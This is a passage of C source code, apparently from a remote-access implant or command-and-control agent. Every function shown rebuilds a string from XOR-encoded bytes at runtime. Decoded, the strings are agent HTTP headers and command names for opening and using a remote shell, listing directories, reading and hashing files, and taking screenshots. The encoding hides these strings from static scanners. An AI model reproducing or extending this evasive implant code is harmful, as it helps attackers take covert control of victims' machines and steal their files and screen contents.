    *(volatile CHAR *)&buf[34] = (0x41u ^ key);
    *(volatile CHAR *)&buf[35] = (0x57u ^ key);
    *(volatile CHAR *)&buf[36] = (0x57u ^ key);
    *(volatile CHAR *)&buf[37] = (0x09u ^ key);
    *(volatile CHAR *)&buf[38] = (0x65u ^ key);
    *(volatile CHAR *)&buf[39] = (0x56u ^ key);
    *(volatile CHAR *)&buf[40] = (0x47u ^ key);
    *(volatile CHAR *)&buf[41] = (0x4Cu ^ key);
    *(volatile CHAR *)&buf[42] = (0x1Eu ^ key);
    *(volatile CHAR *)&buf[43] = (0x04u ^ key);
    *(volatile CHAR *)&buf[44] = (0x5Cu ^ key);
    *(volatile CHAR *)&buf[45] = (0x1Cu ^ key);
    *(volatile CHAR *)&buf[46] = (0x12u ^ key);
    *(volatile CHAR *)&buf[47] = (0x7Bu ^ key);
    *(volatile CHAR *)&buf[48] = (0x12u ^ key);
    *(volatile CHAR *)&buf[49] = (0x10u ^ key);
    *(volatile CHAR *)&buf[50] = (0x29u ^ key);
    *(volatile CHAR *)&buf[51] = (0x2Eu ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[52] = 0;
}

static VOID StrValArchI386(PCHAR buf)
{
    volatile UINT32 key = 0x37;
    *(volatile CHAR *)&buf[0] = (0x6Fu ^ key);
    *(volatile CHAR *)&buf[1] = (0x1Au ^ key);
    *(volatile CHAR *)&buf[2] = (0x76u ^ key);
    *(volatile CHAR *)&buf[3] = (0x50u ^ key);
    *(volatile CHAR *)&buf[4] = (0x52u ^ key);
    *(volatile CHAR *)&buf[5] = (0x59u ^ key);
    *(volatile CHAR *)&buf[6] = (0x43u ^ key);
    *(volatile CHAR *)&buf[7] = (0x1Au ^ key);
    *(volatile CHAR *)&buf[8] = (0x76u ^ key);
    *(volatile CHAR *)&buf[9] = (0x45u ^ key);
    *(volatile CHAR *)&buf[10] = (0x54u ^ key);
    *(volatile CHAR *)&buf[11] = (0x5Fu ^ key);
    *(volatile CHAR *)&buf[12] = (0x0Du ^ key);
    *(volatile CHAR *)&buf[13] = (0x17u ^ key);
    *(volatile CHAR *)&buf[14] = (0x5Eu ^ key);
    *(volatile CHAR *)&buf[15] = (0x04u ^ key);
    *(volatile CHAR *)&buf[16] = (0x0Fu ^ key);
    *(volatile CHAR *)&buf[17] = (0x01u ^ key);
    *(volatile CHAR *)&buf[18] = (0x3Au ^ key);
    *(volatile CHAR *)&buf[19] = (0x3Du ^ key);
    *(volatile CHAR *)&buf[20] = (0x6Fu ^ key);
    *(volatile CHAR *)&buf[21] = (0x1Au ^ key);
    *(volatile CHAR *)&buf[22] = (0x76u ^ key);
    *(volatile CHAR *)&buf[23] = (0x50u ^ key);
    *(volatile CHAR *)&buf[24] = (0x52u ^ key);
    *(volatile CHAR *)&buf[25] = (0x59u ^ key);
    *(volatile CHAR *)&buf[26] = (0x43u ^ key);
    *(volatile CHAR *)&buf[27] = (0x1Au ^ key);
    *(volatile CHAR *)&buf[28] = (0x67u ^ key);
    *(volatile CHAR *)&buf[29] = (0x45u ^ key);
    *(volatile CHAR *)&buf[30] = (0x58u ^ key);
    *(volatile CHAR *)&buf[31] = (0x54u ^ key);
    *(volatile CHAR *)&buf[32] = (0x52u ^ key);
    *(volatile CHAR *)&buf[33] = (0x44u ^ key);
    *(volatile CHAR *)&buf[34] = (0x44u ^ key);
    *(volatile CHAR *)&buf[35] = (0x1Au ^ key);
    *(volatile CHAR *)&buf[36] = (0x76u ^ key);
    *(volatile CHAR *)&buf[37] = (0x45u ^ key);
    *(volatile CHAR *)&buf[38] = (0x54u ^ key);
    *(volatile CHAR *)&buf[39] = (0x5Fu ^ key);
    *(volatile CHAR *)&buf[40] = (0x0Du ^ key);
    *(volatile CHAR *)&buf[41] = (0x17u ^ key);
    *(volatile CHAR *)&buf[42] = (0x5Eu ^ key);
    *(volatile CHAR *)&buf[43] = (0x04u ^ key);
    *(volatile CHAR *)&buf[44] = (0x0Fu ^ key);
    *(volatile CHAR *)&buf[45] = (0x01u ^ key);
    *(volatile CHAR *)&buf[46] = (0x3Au ^ key);
    *(volatile CHAR *)&buf[47] = (0x3Du ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[48] = 0;
}

static VOID StrValArchArm64(PCHAR buf)
{
    volatile UINT32 key = 0x35;
    *(volatile CHAR *)&buf[0] = (0x6Du ^ key);
    *(volatile CHAR *)&buf[1] = (0x18u ^ key);
    *(volatile CHAR *)&buf[2] = (0x74u ^ key);
    *(volatile CHAR *)&buf[3] = (0x52u ^ key);
    *(volatile CHAR *)&buf[4] = (0x50u ^ key);
    *(volatile CHAR *)&buf[5] = (0x5Bu ^ key);
    *(volatile CHAR *)&buf[6] = (0x41u ^ key);
    *(volatile CHAR *)&buf[7] = (0x18u ^ key);
    *(volatile CHAR *)&buf[8] = (0x74u ^ key);
    *(volatile CHAR *)&buf[9] = (0x47u ^ key);
    *(volatile CHAR *)&buf[10] = (0x56u ^ key);
    *(volatile CHAR *)&buf[11] = (0x5Du ^ key);
    *(volatile CHAR *)&buf[12] = (0x0Fu ^ key);
    *(volatile CHAR *)&buf[13] = (0x15u ^ key);
    *(volatile CHAR *)&buf[14] = (0x54u ^ key);
    *(volatile CHAR *)&buf[15] = (0x54u ^ key);
    *(volatile CHAR *)&buf[16] = (0x47u ^ key);
    *(volatile CHAR *)&buf[17] = (0x56u ^ key);
    *(volatile CHAR *)&buf[18] = (0x5Du ^ key);
    *(volatile CHAR *)&buf[19] = (0x03u ^ key);
    *(volatile CHAR *)&buf[20] = (0x01u ^ key);
    *(volatile CHAR *)&buf[21] = (0x38u ^ key);
    *(volatile CHAR *)&buf[22] = (0x3Fu ^ key);
    *(volatile CHAR *)&buf[23] = (0x6Du ^ key);
    *(volatile CHAR *)&buf[24] = (0x18u ^ key);
    *(volatile CHAR *)&buf[25] = (0x74u ^ key);
    *(volatile CHAR *)&buf[26] = (0x52u ^ key);
    *(volatile CHAR *)&buf[27] = (0x50u ^ key);
    *(volatile CHAR *)&buf[28] = (0x5Bu ^ key);
    *(volatile CHAR *)&buf[29] = (0x41u ^ key);
    *(volatile CHAR *)&buf[30] = (0x18u ^ key);
    *(volatile CHAR *)&buf[31] = (0x65u ^ key);
    *(volatile CHAR *)&buf[32] = (0x47u ^ key);
    *(volatile CHAR *)&buf[33] = (0x5Au ^ key);
    *(volatile CHAR *)&buf[34] = (0x56u ^ key);
    *(volatile CHAR *)&buf[35] = (0x50u ^ key);
    *(volatile CHAR *)&buf[36] = (0x46u ^ key);
    *(volatile CHAR *)&buf[37] = (0x46u ^ key);
    *(volatile CHAR *)&buf[38] = (0x18u ^ key);
    *(volatile CHAR *)&buf[39] = (0x74u ^ key);
    *(volatile CHAR *)&buf[40] = (0x47u ^ key);
    *(volatile CHAR *)&buf[41] = (0x56u ^ key);
    *(volatile CHAR *)&buf[42] = (0x5Du ^ key);
    *(volatile CHAR *)&buf[43] = (0x0Fu ^ key);
    *(volatile CHAR *)&buf[44] = (0x54u ^ key);
    *(volatile CHAR *)&buf[45] = (0x54u ^ key);
    *(volatile CHAR *)&buf[46] = (0x47u ^ key);
    *(volatile CHAR *)&buf[47] = (0x56u ^ key);
    *(volatile CHAR *)&buf[48] = (0x5Du ^ key);
    *(volatile CHAR *)&buf[49] = (0x03u ^ key);
    *(volatile CHAR *)&buf[50] = (0x01u ^ key);
    *(volatile CHAR *)&buf[51] = (0x38u ^ key);
    *(volatile CHAR *)&buf[52] = (0x3Fu ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[53] = 0;
}
static VOID StrNameBinMsg(PCHAR buf)
{
    volatile UINT32 key = 0x6F;
    *(volatile CHAR *)&buf[0] = (0x0Du ^ key);
    *(volatile CHAR *)&buf[1] = (0x06u ^ key);
    *(volatile CHAR *)&buf[2] = (0x01u ^ key);
    *(volatile CHAR *)&buf[3] = (0x0Eu ^ key);
    *(volatile CHAR *)&buf[4] = (0x1Du ^ key);
    *(volatile CHAR *)&buf[5] = (0x16u ^ key);
    *(volatile CHAR *)&buf[6] = (0x42u ^ key);
    *(volatile CHAR *)&buf[7] = (0x02u ^ key);
    *(volatile CHAR *)&buf[8] = (0x0Au ^ key);
    *(volatile CHAR *)&buf[9] = (0x1Cu ^ key);
    *(volatile CHAR *)&buf[10] = (0x1Cu ^ key);
    *(volatile CHAR *)&buf[11] = (0x0Eu ^ key);
    *(volatile CHAR *)&buf[12] = (0x08u ^ key);
    *(volatile CHAR *)&buf[13] = (0x0Au ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[14] = 0;
}

static VOID StrNameBinFrag(PCHAR buf)
{
    volatile UINT32 key = 0xCE;
    *(volatile CHAR *)&buf[0] = (0xACu ^ key);
    *(volatile CHAR *)&buf[1] = (0xA7u ^ key);
    *(volatile CHAR *)&buf[2] = (0xA0u ^ key);
    *(volatile CHAR *)&buf[3] = (0xAFu ^ key);
    *(volatile CHAR *)&buf[4] = (0xBCu ^ key);
    *(volatile CHAR *)&buf[5] = (0xB7u ^ key);
    *(volatile CHAR *)&buf[6] = (0xE3u ^ key);
    *(volatile CHAR *)&buf[7] = (0xA8u ^ key);
    *(volatile CHAR *)&buf[8] = (0xBCu ^ key);
    *(volatile CHAR *)&buf[9] = (0xAFu ^ key);
    *(volatile CHAR *)&buf[10] = (0xA9u ^ key);
    *(volatile CHAR *)&buf[11] = (0xA3u ^ key);
    *(volatile CHAR *)&buf[12] = (0xABu ^ key);
    *(volatile CHAR *)&buf[13] = (0xA0u ^ key);
    *(volatile CHAR *)&buf[14] = (0xBAu ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[15] = 0;
}

static VOID StrNameUtf8Msg(PCHAR buf)
{
    volatile UINT32 key = 0x31;
    *(volatile CHAR *)&buf[0] = (0x44u ^ key);
    *(volatile CHAR *)&buf[1] = (0x45u ^ key);
    *(volatile CHAR *)&buf[2] = (0x57u ^ key);
    *(volatile CHAR *)&buf[3] = (0x09u ^ key);
    *(volatile CHAR *)&buf[4] = (0x1Cu ^ key);
    *(volatile CHAR *)&buf[5] = (0x5Cu ^ key);
    *(volatile CHAR *)&buf[6] = (0x54u ^ key);
    *(volatile CHAR *)&buf[7] = (0x42u ^ key);
    *(volatile CHAR *)&buf[8] = (0x42u ^ key);
    *(volatile CHAR *)&buf[9] = (0x50u ^ key);
    *(volatile CHAR *)&buf[10] = (0x56u ^ key);
    *(volatile CHAR *)&buf[11] = (0x54u ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[12] = 0;
}

static VOID StrNameUtf8Frag(PCHAR buf)
{
    volatile UINT32 key = 0xC9;
    *(volatile CHAR *)&buf[0] = (0xBCu ^ key);
    *(volatile CHAR *)&buf[1] = (0xBDu ^ key);
    *(volatile CHAR *)&buf[2] = (0xAFu ^ key);
    *(volatile CHAR *)&buf[3] = (0xF1u ^ key);
    *(volatile CHAR *)&buf[4] = (0xE4u ^ key);
    *(volatile CHAR *)&buf[5] = (0xAFu ^ key);
    *(volatile CHAR *)&buf[6] = (0xBBu ^ key);
    *(volatile CHAR *)&buf[7] = (0xA8u ^ key);
    *(volatile CHAR *)&buf[8] = (0xAEu ^ key);
    *(volatile CHAR *)&buf[9] = (0xA4u ^ key);
    *(volatile CHAR *)&buf[10] = (0xACu ^ key);
    *(volatile CHAR *)&buf[11] = (0xA7u ^ key);
    *(volatile CHAR *)&buf[12] = (0xBDu ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[13] = 0;
}

static VOID StrNameClose(PCHAR buf)
{
    volatile UINT32 key = 0x7E;
    *(volatile CHAR *)&buf[0] = (0x1Du ^ key);
    *(volatile CHAR *)&buf[1] = (0x12u ^ key);
    *(volatile CHAR *)&buf[2] = (0x11u ^ key);
    *(volatile CHAR *)&buf[3] = (0x0Du ^ key);
    *(volatile CHAR *)&buf[4] = (0x1Bu ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[5] = 0;
}

static VOID StrNameUnknown(PCHAR buf)
{
    volatile UINT32 key = 0x83;
    *(volatile CHAR *)&buf[0] = (0xF6u ^ key);
    *(volatile CHAR *)&buf[1] = (0xEDu ^ key);
    *(volatile CHAR *)&buf[2] = (0xE8u ^ key);
    *(volatile CHAR *)&buf[3] = (0xEDu ^ key);
    *(volatile CHAR *)&buf[4] = (0xECu ^ key);
    *(volatile CHAR *)&buf[5] = (0xF4u ^ key);
    *(volatile CHAR *)&buf[6] = (0xEDu ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[7] = 0;
}

static VOID StrNameListDir(PCHAR buf)
{
    volatile UINT32 key = 0x98;
    *(volatile CHAR *)&buf[0] = (0xD4u ^ key);
    *(volatile CHAR *)&buf[1] = (0xF1u ^ key);
    *(volatile CHAR *)&buf[2] = (0xEBu ^ key);
    *(volatile CHAR *)&buf[3] = (0xECu ^ key);
    *(volatile CHAR *)&buf[4] = (0xDCu ^ key);
    *(volatile CHAR *)&buf[5] = (0xF1u ^ key);
    *(volatile CHAR *)&buf[6] = (0xEAu ^ key);
    *(volatile CHAR *)&buf[7] = (0xFDu ^ key);
    *(volatile CHAR *)&buf[8] = (0xFBu ^ key);
    *(volatile CHAR *)&buf[9] = (0xECu ^ key);
    *(volatile CHAR *)&buf[10] = (0xF7u ^ key);
    *(volatile CHAR *)&buf[11] = (0xEAu ^ key);
    *(volatile CHAR *)&buf[12] = (0xE1u ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[13] = 0;
}

static VOID StrNameReadFile(PCHAR buf)
{
    volatile UINT32 key = 0x91;
    *(volatile CHAR *)&buf[0] = (0xC3u ^ key);
    *(volatile CHAR *)&buf[1] = (0xF4u ^ key);
    *(volatile CHAR *)&buf[2] = (0xF0u ^ key);
    *(volatile CHAR *)&buf[3] = (0xF5u ^ key);
    *(volatile CHAR *)&buf[4] = (0xD7u ^ key);
    *(volatile CHAR *)&buf[5] = (0xF8u ^ key);
    *(volatile CHAR *)&buf[6] = (0xFDu ^ key);
    *(volatile CHAR *)&buf[7] = (0xF4u ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[8] = 0;
}

static VOID StrNameHashFile(PCHAR buf)
{
    volatile UINT32 key = 0x1A;
    *(volatile CHAR *)&buf[0] = (0x52u ^ key);
    *(volatile CHAR *)&buf[1] = (0x7Bu ^ key);
    *(volatile CHAR *)&buf[2] = (0x69u ^ key);
    *(volatile CHAR *)&buf[3] = (0x72u ^ key);
    *(volatile CHAR *)&buf[4] = (0x5Cu ^ key);
    *(volatile CHAR *)&buf[5] = (0x73u ^ key);
    *(volatile CHAR *)&buf[6] = (0x76u ^ key);
    *(volatile CHAR *)&buf[7] = (0x7Fu ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[8] = 0;
}

static VOID StrNameWriteShell(PCHAR buf)
{
    volatile UINT32 key = 0x9F;
    *(volatile CHAR *)&buf[0] = (0xC8u ^ key);
    *(volatile CHAR *)&buf[1] = (0xEDu ^ key);
    *(volatile CHAR *)&buf[2] = (0xF6u ^ key);
    *(volatile CHAR *)&buf[3] = (0xEBu ^ key);
    *(volatile CHAR *)&buf[4] = (0xFAu ^ key);
    *(volatile CHAR *)&buf[5] = (0xCCu ^ key);
    *(volatile CHAR *)&buf[6] = (0xF7u ^ key);
    *(volatile CHAR *)&buf[7] = (0xFAu ^ key);
    *(volatile CHAR *)&buf[8] = (0xF3u ^ key);
    *(volatile CHAR *)&buf[9] = (0xF3u ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[10] = 0;
}

static VOID StrNameReadShell(PCHAR buf)
{
    volatile UINT32 key = 0x74;
    *(volatile CHAR *)&buf[0] = (0x26u ^ key);
    *(volatile CHAR *)&buf[1] = (0x11u ^ key);
    *(volatile CHAR *)&buf[2] = (0x15u ^ key);
    *(volatile CHAR *)&buf[3] = (0x10u ^ key);
    *(volatile CHAR *)&buf[4] = (0x27u ^ key);
    *(volatile CHAR *)&buf[5] = (0x1Cu ^ key);
    *(volatile CHAR *)&buf[6] = (0x11u ^ key);
    *(volatile CHAR *)&buf[7] = (0x18u ^ key);
    *(volatile CHAR *)&buf[8] = (0x18u ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[9] = 0;
}

static VOID StrNameGetDisplays(PCHAR buf)
{
    volatile UINT32 key = 0x85;
    *(volatile CHAR *)&buf[0] = (0xC2u ^ key);
    *(volatile CHAR *)&buf[1] = (0xE0u ^ key);
    *(volatile CHAR *)&buf[2] = (0xF1u ^ key);
    *(volatile CHAR *)&buf[3] = (0xC1u ^ key);
    *(volatile CHAR *)&buf[4] = (0xECu ^ key);
    *(volatile CHAR *)&buf[5] = (0xF6u ^ key);
    *(volatile CHAR *)&buf[6] = (0xF5u ^ key);
    *(volatile CHAR *)&buf[7] = (0xE9u ^ key);
    *(volatile CHAR *)&buf[8] = (0xE4u ^ key);
    *(volatile CHAR *)&buf[9] = (0xFCu ^ key);
    *(volatile CHAR *)&buf[10] = (0xF6u ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[11] = 0;
}

static VOID StrNameGetScreenshot(PCHAR buf)
{
    volatile UINT32 key = 0x46;
    *(volatile CHAR *)&buf[0] = (0x01u ^ key);
    *(volatile CHAR *)&buf[1] = (0x23u ^ key);
    *(volatile CHAR *)&buf[2] = (0x32u ^ key);
    *(volatile CHAR *)&buf[3] = (0x15u ^ key);
    *(volatile CHAR *)&buf[4] = (0x25u ^ key);
    *(volatile CHAR *)&buf[5] = (0x34u ^ key);
    *(volatile CHAR *)&buf[6] = (0x23u ^ key);
    *(volatile CHAR *)&buf[7] = (0x23u ^ key);
    *(volatile CHAR *)&buf[8] = (0x28u ^ key);
    *(volatile CHAR *)&buf[9] = (0x35u ^ key);
    *(volatile CHAR *)&buf[10] = (0x2Eu ^ key);
    *(volatile CHAR *)&buf[11] = (0x29u ^ key);
    *(volatile CHAR *)&buf[12] = (0x32u ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[13] = 0;
}

static VOID StrNameCloseShell(PCHAR buf)
{
    volatile UINT32 key = 0xE9;
    *(volatile CHAR *)&buf[0] = (0xAAu ^ key);
    *(volatile CHAR *)&buf[1] = (0x85u ^ key);
    *(volatile CHAR *)&buf[2] = (0x86u ^ key);
    *(volatile CHAR *)&buf[3] = (0x9Au ^ key);
    *(volatile CHAR *)&buf[4] = (0x8Cu ^ key);
    *(volatile CHAR *)&buf[5] = (0xBAu ^ key);
    *(volatile CHAR *)&buf[6] = (0x81u ^ key);
    *(volatile CHAR *)&buf[7] = (0x8Cu ^ key);
    *(volatile CHAR *)&buf[8] = (0x85u ^ key);
    *(volatile CHAR *)&buf[9] = (0x85u ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[10] = 0;
}

static VOID StrNameExit(PCHAR buf)
{
    volatile UINT32 key = 0x69;
    *(volatile CHAR *)&buf[0] = (0x2Cu ^ key);
    *(volatile CHAR *)&buf[1] = (0x11u ^ key);
    *(volatile CHAR *)&buf[2] = (0x00u ^ key);
    *(volatile CHAR *)&buf[3] = (0x1Du ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[4] = 0;
}

static VOID StrNameOpenShell(PCHAR buf)
{
    volatile UINT32 key = 0x75;
    *(volatile CHAR *)&buf[0] = (0x3Au ^ key);
    *(volatile CHAR *)&buf[1] = (0x05u ^ key);
    *(volatile CHAR *)&buf[2] = (0x10u ^ key);
    *(volatile CHAR *)&buf[3] = (0x1Bu ^ key);
    *(volatile CHAR *)&buf[4] = (0x26u ^ key);
    *(volatile CHAR *)&buf[5] = (0x1Du ^ key);
    *(volatile CHAR *)&buf[6] = (0x10u ^ key);
    *(volatile CHAR *)&buf[7] = (0x19u ^ key);
    *(volatile CHAR *)&buf[8] = (0x19u ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[9] = 0;
}

